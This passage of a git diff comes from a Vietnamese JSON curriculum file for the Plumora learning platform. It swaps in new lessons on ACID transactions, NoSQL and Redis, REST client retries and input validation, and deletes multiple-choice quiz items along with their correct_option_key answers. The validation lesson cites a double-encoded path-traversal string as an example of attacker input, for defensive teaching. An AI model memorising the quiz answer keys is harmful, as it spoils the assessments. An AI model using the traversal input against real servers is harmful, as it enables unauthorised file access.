Index đó cho câu truy vấn `WHERE tier = 2`?\n2. Khi dùng `OFFSET 50000 LIMIT 20` để phân trang bảng lịch sử 10 triệu dòng, DB tốn chi phí gì và Keyset Pagination khắc phục ra sao?\n3. Trong thiết kế bảng `outbox_events`, dùng Partial Index `WHERE published_at IS NULL` mang lại lợi ích gì cho tốc độ ghi và quét hàng đợi?",
+      "is_shared": false
     },
     {
       "action_id": 4,
@@ -245,57 +49,8 @@
       "prerequisites": [
         3
       ],
-      "lesson_markdown": "## 1. Bốn tính chất ACID của Giao dịch Cơ sở dữ liệu\n\n| Thuộc tính | Ý nghĩa Kỹ thuật trong Plumora |\n| --- | --- |\n| **Atomicity (Nguyên tử)** | Khi nộp Quiz, việc ghi `quiz_attempts`, cập nhật `user_concept_mastery` và tăng `state_version` hoặc thành công trọn vẹn (`COMMIT`), hoặc hủy bỏ hoàn toàn (`ROLLBACK`). |\n| **Consistency (Nhất quán)** | Dữ liệu luôn thỏa mãn mọi ràng buộc `PK`, `FK`, `UNIQUE(user_id, submission_id)` và `CHECK (0.0 <= mastery_score <= 1.0)`. |\n| **Isolation (Cô lập)** | Các giao dịch đồng thời không làm sai lệch điểm `mastery = max(old, score)` nhờ khóa dòng (`SELECT ... FOR UPDATE`). |\n| **Durability (Bền vững)** | Sau khi `COMMIT`, kết quả được ghi vào Write-Ahead Log (`WAL`) của PostgreSQL, không mất khi khởi động lại. |\n\n```sql\nBEGIN;\nSELECT state_version FROM users WHERE id = :user_id FOR UPDATE;\nINSERT INTO quiz_attempts (...) VALUES (...);\nUPDATE user_concept_mastery SET mastery_score = GREATEST(mastery_score, :score) WHERE ...;\nUPDATE users SET state_version = state_version + 1 WHERE id = :user_id;\nCOMMIT;\n```\n\n## 2. Đánh đổi khi thiết kế B-Tree Index\n\n- **Ưu điểm:** Giảm độ phức tạp tìm kiếm từ quét tuần tự `O(N)` (`Seq Scan`) xuống `O(log N)` (`Index Scan`) trên các cột tra cứu thường xuyên (`username`, `(user_id, submission_id)`).\n- **Đánh đổi (Trade-off):** Tốn thêm dung lượng lưu trữ và tăng chi phí ghi (`INSERT/UPDATE/DELETE`) do phải cập nhật cây chỉ mục.",
-      "questions": [
-        {
-          "id": "00000000-0000-4000-8000-000000000401",
-          "display_order": 1,
-          "prompt": "Tính chất nào trong bộ ACID đảm bảo rằng một giao dịch (Transaction) hoặc được thực hiện trọn vẹn tất cả các bước, hoặc không có bước nào được ghi nhận nếu xảy ra lỗi giữa chừng?",
-          "options": {
-            "A": "Consistency (Tính nhất quán)",
-            "B": "Atomicity (Tính nguyên tử)",
-            "C": "Isolation (Tính cô lập)",
-            "D": "Durability (Tính bền vững)"
-          },
-          "correct_option_key": "B"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000402",
-          "display_order": 2,
-          "prompt": "Khi hai yêu cầu nộp bài của cùng một người dùng đến đồng thời, câu lệnh nào trong PostgreSQL giúp khóa dòng người dùng để tránh Lost Update?",
-          "options": {
-            "A": "EXPLAIN ANALYZE",
-            "B": "SELECT DISTINCT không có giao dịch",
-            "C": "DROP TABLE users",
-            "D": "SELECT ... FOR UPDATE trong một ACID Transaction"
-          },
-          "correct_option_key": "D"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000403",
-          "display_order": 3,
-          "prompt": "Đánh chỉ mục B-Tree (Index) trên cặp cột `(user_id, submission_id)` mang lại lợi ích và đánh đổi nào?",
-          "options": {
-            "A": "Tăng tốc truy vấn kiểm tra nộp trùng từ O(N) xuống O(log N), nhưng tốn thêm chi phí cập nhật chỉ mục khi INSERT",
-            "B": "Làm cho mọi câu lệnh INSERT nhanh gấp 100 lần mà không tốn bộ nhớ",
-            "C": "Tự động xóa các bản ghi cũ sau 60 giây",
-            "D": "Biến bảng quan hệ thành bộ nhớ đệm Redis"
-          },
-          "correct_option_key": "A"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000404",
-          "display_order": 4,
-          "prompt": "Thành phần nào của PostgreSQL đảm bảo tính Bền vững (Durability) để dữ liệu đã COMMIT không bị mất khi sập nguồn đột ngột?",
-          "options": {
-            "A": "Bộ nhớ đệm DNS của nhà mạng",
-            "B": "Biến tạm trong bộ nhớ RAM của trình duyệt",
-            "C": "Nhật ký ghi trước WAL (Write-Ahead Logging) được đồng bộ xuống đĩa",
-            "D": "File CSS của giao diện Frontend"
-          },
-          "correct_option_key": "C"
-        }
-      ]
+      "lesson_markdown": "## 1. Mô hình Tư duy & Bài toán Thực tế\n\nKhi hai người dùng cùng mua chiếc vợt cầu lông cuối cùng trong kho hoặc một learner gửi đồng thời 2 request `submit` để cộng điểm hai lần, việc đọc kiểm tra (`SELECT stock`) rồi mới cập nhật (`UPDATE stock = stock - 1`) ở tầng ứng dụng sẽ tạo ra **Race Condition (Lost Update)**. Giao dịch cơ sở dữ liệu (**ACID Transaction**) và cơ chế kiểm soát đồng thời (**MVCC & Locking**) là rào chắn cuối cùng bảo vệ tính đúng đắn của tiền bạc, tồn kho và điểm năng lực.\n\n## 2. Cơ chế Hoạt động Tầng sâu\n\n- **4 Tính chất ACID:** *Atomicity* (tất cả thành công hoặc `ROLLBACK` sạch), *Consistency* (mọi ràng buộc `CHECK`/`FK` đều thỏa), *Isolation* (các giao dịch chạy song song không nhìn thấy dữ liệu rác của nhau), *Durability* (ghi vào Write-Ahead Log `WAL` trước khi xác nhận `COMMIT`).\n- **MVCC (Multi-Version Concurrency Control) trong PostgreSQL:** Người đọc không chặn người viết và người viết không chặn người đọc thông thường nhờ lưu nhiều phiên bản dòng (`xmin`, `xmax`).\n- **Isolation Levels & Dị thường đồng thời:**\n  - `READ COMMITTED` (mặc định PostgreSQL): Chống *Dirty Read*, nhưng vẫn có thể gặp *Non-Repeatable Read* và *Lost Update* nếu đọc rồi mới tính để ghi.\n  - `REPEATABLE READ`: Snapshot cố định từ đầu transaction; tự phát hiện xung đột ghi (`could not serialize access due to concurrent update` — SQLSTATE `40001`) và buộc ứng dụng retry.\n  - `SERIALIZABLE`: Đảm bảo kết quả tương đương thực thi tuần tự tuyệt đối qua *SSI (Serializable Snapshot Isolation)*.\n- **Pessimistic vs Optimistic Locking & Advisory Lock:** `SELECT ... FOR UPDATE` khóa hàng ở mức dòng; **Optimistic Locking** dùng cột `version` (`WHERE id = :id AND version = :v`); `pg_advisory_xact_lock(hashtext(user_id))` khóa logic theo phạm vi người dùng (được Plumora dùng trong `SqlAlchemyUnitOfWork`) giúp tuần tự hóa các cập nhật đa bảng của cùng 1 user mà không gây deadlock chéo bảng.\n\n## 3. Thực hành Chuẩn Production & Anti-patterns\n\n- **Anti-pattern:** Mở DB transaction bao quanh cả lời gọi HTTP ra ngoài (như gọi OpenAI/LLM hoặc Code Sandbox)! Việc giữ transaction mở 3–8 giây sẽ làm cạn kiệt toàn bộ DB Connection Pool và giữ khóa hàng gây nghẽn dây chuyền.\n- **Chuẩn Production:**\n  - Áp dụng mô hình **3-Phase Unit of Work**: (1) Đọc kiểm tra nhanh (không giữ lock) $\rightarrow$ (2) Gọi LLM/Sandbox ngoài DB $\rightarrow$ (3) Mở Transaction ngắn (`<= 50ms`) kèm `pg_advisory_xact_lock` + kiểm tra lại *Idempotency Key* (`submission_id`) rồi `COMMIT`.\n  - Luôn khóa các dòng theo một **thứ tự xác định** (ví dụ sắp xếp `id` tăng dần trước khi `FOR UPDATE`) để triệt tiêu **Deadlock**.\n  - Kết hợp `Transactional Outbox`: ghi sự kiện vào bảng `outbox_events` trong **cùng transaction** với dữ liệu nghiệp vụ thay vì gọi Redis/Kafka trực tiếp rồi mới commit.\n\n## 4. Đánh đổi Kiến trúc (Trade-offs)\n\n| Cơ chế | Ưu điểm | Nhược điểm / Chi phí |\n| :--- | :--- | :--- |\n| **`SELECT ... FOR UPDATE`** | Chặn ghi đè ngay lập tức, không cần retry logic phức tạp | Giảm thông lượng khi tranh chấp cao; dễ Deadlock nếu khóa nhiều dòng không theo thứ tự |\n| **Optimistic (`version`)** | Không giữ khóa DB, thông lượng đọc rất cao | Tỷ lệ lỗi `409 Conflict` / phải retry cao nếu cùng 1 bản ghi bị tranh chấp liên tục |\n| **`pg_advisory_xact_lock(user_id)`** | Tuần tự hóa gọn mọi bảng liên quan đến 1 user; tự nhả khi `COMMIT/ROLLBACK` | Chỉ khóa theo logic ứng dụng quy ước, mọi nhánh ghi đều phải cùng lấy lock này |\n\n## 5. Câu hỏi Phản tư & Kiểm chứng Nhanh\n\n1. Tại sao ở mức `READ COMMITTED`, đoạn code `stock = SELECT ...; if stock > 0: UPDATE stock = stock - 1` vẫn bị âm kho khi 2 request đến cùng mili-giây?\n2. Mô hình **3-Phase Unit of Work** xử lý thế nào để vừa tránh giữ khóa DB lâu khi gọi LLM, vừa không bị ghi trùng nếu 2 request giống hệt nhau chạy song song?\n3. Làm thế nào mẫu **Transactional Outbox** giải quyết bài toán *\"DB đã commit nhưng Redis Streams bị rớt mạng ngay trước khi publish\"*?",
+      "is_shared": false
     },
     {
       "action_id": 5,
@@ -305,57 +60,8 @@
       "prerequisites": [
         3
       ],
-      "lesson_markdown": "## 1. So sánh Cơ sở Dữ liệu Quan hệ (RDBMS) và NoSQL Caching\n\n| Tiêu chí kỹ thuật | PostgreSQL (RDBMS SSoT) | Redis (In-Memory Key-Value) |\n| --- | --- | --- |\n| Phương tiện lưu trữ | Đĩa cứng (NVMe / SSD) có Write-Ahead Log (WAL) | Bộ nhớ truy cập ngẫu nhiên (RAM) |\n| Tốc độ truy xuất | Khoảng 1 - 10 milliseconds | Dưới 1 millisecond (`O(1)` in-memory) |\n| Mục đích sử dụng | Nguồn chân lý duy nhất (`SSoT`), giao dịch ACID | Bộ nhớ đệm trạng thái (`State Cache`), khóa phân tán |\n| Cơ chế hết hạn (TTL) | Không hỗ trợ tự động (cần cron job dọn dẹp) | Hỗ trợ lệnh `EXPIRE` và `SETEX` tự động dọn |\n\n## 2. Thao tác Lưu Cache Vector Trạng thái Học viên trong Redis\n\n```bash\n# Ghi vector quan sát 24 chiều của học viên vào Redis với TTL 3600 giây\nSETEX plumora:state:611f715b-d69e 3600 '{\"state_version\": 5, \"vector\": [1, 1, 0, ...]}'\n\n# Đọc nhanh trạng thái phục vụ mô hình DQN suy luận đề xuất\nGET plumora:state:611f715b-d69e\n```",
-      "questions": [
-        {
-          "id": "00000000-0000-4000-8000-000000000501",
-          "display_order": 1,
-          "prompt": "Mô hình dữ liệu Key-Value trong bộ nhớ (như Redis) phù hợp nhất với tác vụ nào dưới đây?",
-          "options": {
-            "A": "Lưu trữ duy nhất không cần cơ sở dữ liệu bền vững cho giao dịch tài chính",
-            "B": "Thực hiện phép JOIN phức tạp qua 15 bảng kế toán lịch sử nhiều năm",
-            "C": "Lưu đệm (Cache) trạng thái truy cập tần suất cao theo khóa định danh với độ trễ dưới mili-giây và có TTL",
-            "D": "Biên dịch mã nguồn TypeScript sang gói CSS"
-          },
-          "correct_option_key": "C"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000502",
-          "display_order": 2,
-          "prompt": "Vì sao không nên dùng một Key-Value Cache có đặt TTL làm nguồn lưu trữ chuẩn duy nhất (Single Source of Truth) cho tiến độ học tập?",
-          "options": {
-            "A": "Vì các khóa có TTL hoặc khi bộ nhớ đầy/khởi động lại có thể bị xóa, gây mất dữ liệu tiến độ",
-            "B": "Vì Key-Value Store không cho phép lưu chuỗi JSON",
-            "C": "Vì Redis không hỗ trợ giao thức mạng TCP",
-            "D": "Vì dữ liệu trong RAM đọc chậm hơn ổ đĩa từ tính"
-          },
-          "correct_option_key": "A"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000503",
-          "display_order": 3,
-          "prompt": "Kiểu dữ liệu `JSONB` trong PostgreSQL kết hợp ưu điểm gì của mô hình Document vào RDBMS?",
-          "options": {
-            "A": "Không chiếm bất kỳ byte dung lượng nào trên ổ đĩa",
-            "B": "Tự động tắt toàn bộ kiểm tra khóa ngoại của bảng",
-            "C": "Thay thế hoàn toàn giao thức HTTP",
-            "D": "Cho phép lưu cấu trúc dữ liệu bán cấu trúc (như danh sách phương án A/B/C/D) ngay trong giao dịch ACID"
-          },
-          "correct_option_key": "D"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000504",
-          "display_order": 4,
-          "prompt": "Độ phức tạp thời gian trung bình khi tra cứu một khóa đơn lẻ (`GET key`) trong Key-Value Store là bao nhiêu?",
-          "options": {
-            "A": "O(N^2)",
-            "B": "O(1)",
-            "C": "O(2^N)",
-            "D": "O(N!)"
-          },
-          "correct_option_key": "B"
-        }
-      ]
+      "lesson_markdown": "## 1. Mô hình Tư duy & Bài toán Thực tế\n\nKhông phải mọi dữ liệu đều vừa vặn trong các bảng quan hệ cố định. Khi hệ thống cần lưu cấu hình giao diện động, nhật ký sự kiện khối lượng cực lớn, bảng xếp hạng thời gian thực hoặc hàng đợi thông điệp tốc độ cao (`Redis Streams`, `MongoDB`, `DynamoDB`), việc ép toàn bộ vào `JOIN` quan hệ sẽ trở thành nút thắt cổ chai. Tuy nhiên, chọn NoSQL sai chỗ (như lưu giao dịch tài chính đa bảng không có ACID) lại tạo ra cơn ác mộng dữ liệu lệch pha.\n\n## 2. Cơ chế Hoạt động Tầng sâu\n\n- **4 Nhóm CSDL NoSQL chính:**\n  - *Document Store (`MongoDB`, `PostgreSQL JSONB`):* Lưu tài liệu bán cấu trúc (JSON/BSON), đánh index sâu vào thuộc tính lồng nhau (`GIN Index` trong PostgreSQL).\n  - *Key-Value & In-Memory (`Redis`):* Lưu toàn bộ trên RAM, cấu trúc dữ liệu gốc (`String`, `Hash`, `Sorted Set`, `Streams`) cho độ trễ dưới `1ms`.\n  - *Wide-Column (`Cassandra`, `ScyllaDB`):* Tối ưu ghi tuần tự cực lớn theo *Partition Key + Clustering Key* (LSM-Tree), mở rộng tuyến tính đa node.\n  - *Graph DB (`Neo4j`):* Lưu nút và cạnh trực tiếp (*Index-Free Adjacency*) để duyệt đồ thị nhiều bước nhảy nhanh.\n- **Định lý CAP & PACELC:** Khi xảy ra phân vùng mạng (*Partition - P*), hệ thống phân tán phải chọn giữa **Consistency (CP)** (từ chối ghi nếu không đủ quorum) hoặc **Availability (AP)** (vẫn nhận ghi và chấp nhận *Eventual Consistency*). Khi mạng bình thường (*Else*), vẫn phải đánh đổi giữa **Latency (L)** và **Consistency (C)**.\n\n## 3. Thực hành Chuẩn Production & Anti-patterns\n\n- **Anti-pattern:** Thiết kế MongoDB theo kiểu chuẩn hóa bảng rồi dùng `$lookup` để `JOIN` 4–5 collection trên mỗi request (mất hết lợi thế của Document DB và chậm hơn PostgreSQL); hoặc coi `Redis` là nguồn dữ liệu duy nhất cho trạng thái quan trọng mà không có `AOF` / DB dự phòng.\n- **Chuẩn Production:**\n  - Thiết kế mô hình dữ liệu NoSQL theo **mẫu truy vấn (Query-driven / Access Patterns)** thay vì chỉ theo thực thể: dữ liệu nào luôn đọc cùng nhau thì nhúng (*Embed*) cùng nhau; dữ liệu tăng trưởng không giới hạn (log, comment) thì tách tham chiếu.\n  - Dùng **PostgreSQL + `JSONB` (kèm `GIN Index`)** cho bài toán *Hybrid*: vừa giữ ACID quan hệ cho định danh, vừa linh hoạt schema cho cấu hình Rubric hoặc Payload sự kiện.\n  - Dùng **Redis** đúng vai trò: Cache có TTL (`plumora:raw_comp_state:{user_id}`), Sliding-Window Rate Limiter, Revocation List (`jti`) và Message Broker (`Redis Streams` với Consumer Group + `XAUTOCLAIM`).\n\n## 4. Đánh đổi Kiến trúc (Trade-offs)\n\n| Tiêu chí | PostgreSQL (Quan hệ + JSONB) | Document DB (MongoDB) | In-Memory (Redis) |\n| :--- | :--- | :--- | :--- |\n| **Tính nhất quán** | Mạnh (ACID đầy đủ) | Có thể cấu hình (tunable) | Eventual / Đơn luồng |\n| **Schema** | Cố định + linh hoạt qua `JSONB` | Schema-on-read (rất linh hoạt) | Theo cấu trúc dữ liệu |\n| **Độ trễ tiêu biểu** | 2–15ms (SSD + Buffer) | 2–15ms | < 1ms (RAM) |\n| **Mở rộng ghi ngang** | Khó hơn (cần Sharding/Citus) | Tự động Sharding theo Shard Key | Cluster theo Hash Slot |\n\n## 5. Câu hỏi Phản tư & Kiểm chứng Nhanh\n\n1. Theo định lý CAP, khi mạng giữa hai cụm dữ liệu bị đứt (*Network Partition*), tại sao hệ thống không thể vừa đảm bảo *Consistency* tuyệt đối vừa đảm bảo *Availability* 100%?\n2. Trong trường hợp nào nên dùng **PostgreSQL `JSONB`** thay vì dựng thêm một cụm MongoDB riêng biệt (như kiến trúc của Plumora)?\n3. Khi lưu dữ liệu trong Redis làm Cache, điều gì xảy ra nếu đặt toàn bộ Key có cùng thời điểm hết hạn (TTL) giống hệt nhau (*Cache Stampede*) và cách phòng tránh?",
+      "is_shared": false
     },
     {
       "action_id": 6,
@@ -365,57 +71,8 @@
       "prerequisites": [
         2
       ],
-      "lesson_markdown": "## 1. Chuẩn Thiết Kế RESTful API & Mã Trạng Thái HTTP\n\n| Hành động Nghiệp vụ | Endpoint Chuẩn RESTful | Phương thức | Mã HTTP Thành công |\n| --- | --- | --- | --- |\n| Xem danh sách lộ trình | `/api/v1/roadmap` | `GET` | `200 OK` |\n| Xem chi tiết một bài học | `/api/v1/concepts/{slug}` | `GET` | `200 OK` |\n| Nộp bài kiểm tra trắc nghiệm | `/api/v1/concepts/{slug}/attempts` | `POST` | `200 OK` |\n| Đăng nhập hệ thống | `/api/v1/auth/login` | `POST` | `200 OK` |\n| Đăng xuất và hủy phiên | `/api/v1/auth/logout` | `POST` | `200 OK` |\n\n## 2. Khởi tạo Route RESTful với FastAPI & Pydantic\n\n```python\nfrom fastapi import APIRouter, Depends, status\nfrom pydantic import BaseModel\n\nrouter = APIRouter(prefix=\"/api/v1/concepts\", tags=[\"content\"])\n\n@router.get(\"/{slug}\", status_code=status.HTTP_200_OK)\ndef get_concept_detail(slug: str, current_user = Depends(get_current_user)):\n    \"\"\"Truy xuất chi tiết khái niệm theo chuẩn RESTful.\"\"\"\n    return {\"slug\": slug, \"status\": \"unlocked\"}\n```",
-      "questions": [
-        {
-          "id": "00000000-0000-4000-8000-000000000601",
-          "display_order": 1,
-          "prompt": "Đường dẫn (Endpoint URI) nào dưới đây tuân thủ đúng quy ước đặt tên hướng tài nguyên của RESTful API?",
-          "options": {
-            "A": "POST /api/v1/concepts/{slug}/attempts",
-            "B": "GET /api/v1/doSubmitQuizAttemptNow",
-            "C": "POST /api/v1/sql_insert_attempt_row",
-            "D": "DELETE /api/v1/getRoadmapData"
-          },
-          "correct_option_key": "A"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000602",
-          "display_order": 2,
-          "prompt": "Mục đích của việc truyền khóa `submission_id` (UUID) khi gọi `POST /api/v1/concepts/{slug}/attempts` là gì?",
-          "options": {
-            "A": "Để thay thế mật khẩu đăng nhập của người học",
-            "B": "Đảm bảo tính lũy đẳng (Idempotency): nếu client gửi lặp do lỗi mạng, server trả về kết quả lần đầu mà không tạo bản ghi trùng",
-            "C": "Để cho phép nộp bài mà không cần trả lời câu hỏi nào",
-            "D": "Để xóa lịch sử làm bài của tất cả người dùng khác"
-          },
-          "correct_option_key": "B"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000603",
-          "display_order": 3,
-          "prompt": "Nguyên tắc Stateless (Phi trạng thái phiên trên bộ nhớ tiến trình) trong REST giúp ích gì cho Backend?",
-          "options": {
-            "A": "Không cần lưu dữ liệu vào PostgreSQL",
-            "B": "Server không cần kiểm tra quyền truy cập ở các request sau",
-            "C": "Mọi request đều mang đủ thông tin xác thực và trạng thái bền vững nằm ở DB/Cache chung, giúp dễ mở rộng và chịu lỗi",
-            "D": "Bắt buộc client phải gửi toàn bộ mã nguồn ứng dụng trong mỗi request"
-          },
-          "correct_option_key": "C"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000604",
-          "display_order": 4,
-          "prompt": "Vì sao câu trả lời API `GET /api/v1/concepts/{slug}` tuyệt đối không được chứa trường `correct_option_key`?",
-          "options": {
-            "A": "Vì trình duyệt sẽ tự động chặn mọi phản hồi HTTP 200",
-            "B": "Vì JSON không hỗ trợ chuỗi ký tự có độ dài 1",
-            "C": "Vì PostgreSQL không lưu được chữ cái A, B, C, D",
-            "D": "Để tránh lộ đáp án đúng ra phía trình duyệt trước khi người học nộp bài kiểm tra"
-          },
-          "correct_option_key": "D"
-        }
-      ]
+      "lesson_markdown": "## 1. Mô hình Tư duy & Bài toán Thực tế\n\nỞ phía Client, việc tích hợp RESTful API không chỉ dừng ở gọi `fetch()` và hiển thị dữ liệu khi thành công (Happy Path). Trong môi trường mạng thực tế (3G chập chờn, người dùng bấm đúp nút Nộp bài, server trả lỗi phân trang hoặc hết phiên 401), tầng **API Client** phải đóng vai trò một lớp phòng vệ tập trung: chuẩn hóa hợp đồng lỗi (`error_code`), bảo đảm **tính lũy đẳng (Idempotency)** khi thử lại, và tách biệt hoàn toàn cấu trúc DTO của Backend khỏi giao diện UI.\n\n## 2. Cơ chế Hoạt động Tầng sâu\n\n- **Idempotency Key (Khóa Lũy đẳng phía Client):** Khi người dùng nhấn nút nộp bài thi hoặc thanh toán, Client sinh một `submission_id` (UUIDv4) cố định cho lượt thao tác đó. Nếu mạng rớt và Client thực hiện retry (với Exponential Backoff), cùng `submission_id` đó được gửi lại để Backend nhận diện và trả về kết quả ban đầu mà không tạo bản ghi trùng lặp.\n- **Chuẩn hóa Khung Lỗi (Typed Error Envelope):** Mọi phản hồi lỗi `4xx`/`5xx` được chuyển thành một đối tượng `ApiError(status, errorCode, message, details)` giúp từng màn hình xử lý nhánh lỗi chính xác (ví dụ `403 CONCEPT_LOCKED` mở thẻ giải thích bài tiên quyết, `408 SANDBOX_TIMEOUT` cảnh báo vòng lặp vô hạn).\n- **Phân trang Cursor vs Offset:** Khi dữ liệu thay đổi liên tục (danh sách bài nộp, feed thông báo), phân trang bằng `cursor` giữ ổn định vị trí trang, tránh bị trùng lặp hoặc bỏ sót bản ghi như phân trang `offset`.\n\n## 3. Ví dụ Mã nguồn Thực chiến\n\n```typescript\n// API Client chuẩn có Exponential Backoff + Jitter cho request an toàn/lũy đẳng\nexport class ApiError extends Error {\n  constructor(\n    public readonly status: number,\n    public readonly errorCode: string,\n    message: string,\n    public readonly details?: Record<string, unknown>,\n  ) {\n    super(message);\n  }\n}\n\nexport async function fetchWithRetry<T>(\n  url: string,\n  init: RequestInit,\n  maxRetries = 2,\n): Promise<T> {\n  let attempt = 0;\n  while (true) {\n    const res = await fetch(url, { credentials: 'include', ...init });\n    if (res.ok) return (await res.json()) as T;\n    // Chỉ retry lỗi 5xx tạm thời hoặc 429; tuyệt đối không retry lỗi 400/401/403/422\n    if ((res.status >= 500 || res.status === 429) && attempt < maxRetries) {\n      attempt += 1;\n      const delayMs = Math.min(2000, 150 * 2 ** attempt) + Math.random() * 100;\n      await new Promise((r) => setTimeout(r, delayMs));\n      continue;\n    }\n    const err = await res.json().catch(() => ({}));\n    throw new ApiError(res.status, err?.detail?.error_code ?? 'HTTP_ERROR', err?.detail?.message ?? res.statusText);\n  }\n}\n```\n\n## 4. Các Sự cố & Bẫy Phổ biến\n\n- **Sinh UUID mới trong mỗi lần bấm thử lại:** Nếu `submission_id` được tạo mới bên trong hàm `handleSubmit()` thay vì lưu vào state cho đến khi nộp thành công, người dùng bấm lại khi mạng lag sẽ vô hiệu hóa cơ chế Idempotency của Backend.\n- **Retry không có giới hạn trên lỗi 4xx:** Thử lại một request `422 Validation Error` hay `401 Unauthorized` chỉ làm lãng phí tài nguyên máy chủ.\n\n## 5. Bảng Đánh đổi Kiến trúc\n\n| Mẫu tích hợp Client | Ưu điểm | Đánh đổi cần cân nhắc |\n| --- | --- | --- |\n| **REST + Typed Fetch Wrapper** | Gọn nhẹ, tận dụng tốt HTTP Cache và mã trạng thái chuẩn | Dễ bị over-fetching / under-fetching khi UI thay đổi nhanh |\n| **Cursor Pagination** | Hiệu năng `O(1)` theo index, không bị trượt dòng khi thêm dữ liệu | Không hỗ trợ nhảy thẳng đến \"Trang số 15\" |\n| **Exponential Backoff + Jitter** | Tránh bão thử lại đồng loạt (Thundering Herd) làm sập server | Tăng thời gian chờ tổng thể trước khi báo lỗi cho người dùng |",
+      "is_shared": true
     },
     {
       "action_id": 7,
@@ -425,57 +82,8 @@
       "prerequisites": [
         6
       ],
-      "lesson_markdown": "## 1. Kiểm Thực Dữ Liệu Tầng Server vs Tầng Client\n\n| Tiêu chí | Kiểm thực Client-side (Frontend) | Kiểm thực Server-side (FastAPI / Pydantic) |\n| --- | --- | --- |\n| Trải nghiệm người dùng | Phản hồi tức thì, không tốn băng thông mạng | Độ trễ mạng phụ thuộc đường truyền |\n| Độ tin cậy bảo mật | Không đáng tin cậy (kẻ tấn công có thể bypass) | Đáng tin cậy tuyệt đối, là rào chắn phòng thủ |\n| Xử lý khi vi phạm | Hiển thị cảnh báo trực tiếp trên form nhập | Trả về mã lỗi `422 Unprocessable Entity` |\n\n## 2. Định nghĩa Schema Kiểm thực Pydantic v2\n\n```python\nfrom pydantic import BaseModel, Field, field_validator\nimport uuid\n\nclass SubmitAttemptRequest(BaseModel):\n    submission_id: str = Field(..., description=\"UUID định danh duy nhất lượt nộp\")\n    answers: list[AnswerItemRequest] = Field(..., min_length=4, max_length=4)\n\n    @field_validator(\"submission_id\")\n    def validate_uuid_format(cls, value: str) -> str:\n        # Ngăn chặn injection và bảo đảm cấu trúc UUID hợp lệ\n        uuid.UUID(value)\n        return value\n```",
-      "questions": [
-        {
-          "id": "00000000-0000-4000-8000-000000000701",
-          "display_order": 1,
-          "prompt": "Khi người học gửi yêu cầu nộp bài Quiz nhưng chỉ chọn 3/4 câu hỏi, API cần xử lý như thế nào?",
-          "options": {
-            "A": "Trả về mã 200 OK với điểm thông thạo 100%",
-            "B": "Tự động điền ngẫu nhiên câu thứ 4 và chấm điểm",
-            "C": "Xóa tài khoản của người học",
-            "D": "Từ chối với mã 422 (QUIZ_VALIDATION_ERROR) và không ghi hay làm thay đổi dữ liệu trong PostgreSQL"
-          },
-          "correct_option_key": "D"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000702",
-          "display_order": 2,
-          "prompt": "Lợi ích của việc chuẩn hóa mọi phản hồi lỗi theo một khung JSON thống nhất (`error_code`, `message`, `details`) là gì?",
-          "options": {
-            "A": "Để gửi kèm mật khẩu quản trị cơ sở dữ liệu về cho client",
-            "B": "Để trình duyệt tự động bỏ qua mọi lỗi xác thực",
-            "C": "Giúp Frontend xử lý nhánh lỗi chính xác theo `error_code` và hiển thị thông báo thân thiện mà không lộ chi tiết nhạy cảm",
-            "D": "Để giảm kích thước bảng trong PostgreSQL"
-          },
-          "correct_option_key": "C"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000703",
-          "display_order": 3,
-          "prompt": "Quá trình Serialization tại tầng trả kết quả (Response Model) giúp bảo vệ an toàn dữ liệu như thế nào?",
-          "options": {
-            "A": "Tự động xuất toàn bộ các cột nội bộ của mọi bảng ra JSON",
-            "B": "Chỉ xuất các trường được phép trong hợp đồng (như `id`, `username`, `display_name`), loại bỏ `password_hash` và `correct_option_key`",
-            "C": "Mã hóa giao diện HTML thành tệp nhị phân thực thi",
-            "D": "Bỏ qua kiểm tra kiểu dữ liệu đầu ra"
-          },
-          "correct_option_key": "B"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000704",
-          "display_order": 4,
-          "prompt": "Nếu học viên cố tình gửi `question_id` thuộc về một bài học khác vào payload nộp Quiz của bài hiện tại, hệ thống phải làm gì?",
-          "options": {
-            "A": "Phát hiện không khớp tập câu hỏi của bài học và từ chối với lỗi 422 mà không tạo bản ghi `quiz_attempts`",
-            "B": "Chấp nhận và cộng điểm cho cả hai bài học",
-            "C": "Tự động sửa câu hỏi trong cơ sở dữ liệu theo ý client",
-            "D": "Trả về lỗi 500 kèm toàn bộ chuỗi kết nối cơ sở dữ liệu"
-          },
-          "correct_option_key": "A"
-        }
-      ]
+      "lesson_markdown": "## 1. Mô hình Tư duy & Bài toán Thực tế\n\nMọi dữ liệu đi từ trình duyệt, ứng dụng di động hoặc webhook bên thứ ba đều là **đầu vào không đáng tin cậy (Untrusted Input)**. Nếu Backend tin tưởng vào việc Frontend đã kiểm tra form, kẻ tấn công chỉ cần dùng `curl` gửi trực tiếp payload sai kiểu, chuỗi dài 50MB gây tràn RAM, số âm cho số lượng đặt hàng, hoặc tiêm mã độc qua `path traversal` (`%252e%252e`). **Input Validation** và **Serialization Boundary** là tuyến phòng thủ đầu tiên biến dữ liệu thô thành các đối tượng miền (*Domain Types*) an toàn.\n\n## 2. Cơ chế Hoạt động Tầng sâu\n\n- **Syntactic Validation vs Semantic Validation:**\n  - *Syntactic (Cú pháp/Schema):* Kiểm tra kiểu dữ liệu, độ dài chuỗi, regex định dạng email/UUID, phạm vi số (`Pydantic v2`, `Zod`) ngay tại ranh giới Controller/Router, trả về `422 Unprocessable Entity` nếu sai.\n  - *Semantic (Nghiệp vụ):* Kiểm tra trạng thái hợp lệ trong ngữ cảnh hệ thống (ví dụ: `submission_id` chưa bị dùng cho khái niệm khác, học viên đã mở khóa nhánh DAG và hoàn thành Playbook chưa), trả về `409 Conflict` hoặc `403 Forbidden`.\n- **Pydantic v2 & Type Coercion có kiểm soát:** Pydantic phân tích JSON bằng Rust (`pydantic-core`), loại bỏ trường dư thừa (`extra=\"forbid\"` chống *Mass Assignment*), ép kiểu an toàn và tạo tự động OpenAPI Schema.\n- **Canonicalization trước khi Validate:** Với đường dẫn URL hoặc chuỗi bảo mật, phải chuẩn hóa trước khi kiểm tra để tránh tấn công mã hóa nhiều lớp (*Multi-layer Percent 